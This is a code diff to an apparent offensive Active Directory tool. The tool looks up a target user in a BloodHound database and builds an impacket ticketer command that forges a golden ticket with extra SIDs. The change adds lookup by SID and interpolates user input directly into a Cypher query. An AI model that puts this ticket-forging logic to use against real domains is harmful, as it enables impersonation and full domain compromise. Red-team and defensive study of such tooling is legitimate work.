@@ -35,7 +35,7 @@ def args_parser():
                                 help="Manually add extra sids (SID history) (can be separated by commas)")
     advanced_group.add_argument('-c', '--custom', type=str, default="", help="Custom options")
     # Targeted user
-    parser.add_argument('target_user', type=str, help="Target user to copy (format: <username>[@<domain>])")
+    parser.add_argument('target_user', type=str, help="Target user to copy (format: <username>[@<domain>] or SID)")
     return parser.parse_args()
 
 
@@ -85,8 +85,17 @@ class Group:
 
 
 def findUser(g):
+    if args.target_user.lower().startswith("s-1-5-21-"):
+        # SID mode
+        logger.debug("Search user in SID mode")
+        context = "objectid"
+        match_test = f'(?i){args.target_user}'
+    else:
+        # Classic username mode
+        context = "name"
+        match_test = f'(?i).*{args.target_user}.*'
     req = g.run(f"""MATCH (u:User) 
-    WHERE u.name =~ '(?i).*{args.target_user}.*'
+    WHERE u.{context} =~ '{match_test}'
     RETURN u.name, u.domain, u.objectid, u.sidhistory
     ORDER BY u.enabled DESC,u.name""").to_table()
     user_count = len(req)
@@ -190,7 +199,7 @@ def goldenTicketer(user, groups):
         sids = extraSidList(user)
         return f"-extra-sid {sids} " if sids != "" else ""
 
-    cmd = f"impacket-ticketer {getKey()} " \
+    cmd = f"ticketer.py {getKey()} " \
           f"-domain {user.domain} " \
           f"-domain-sid {user.domain_id} " \
           f"-groups {groupList(groups)} " \
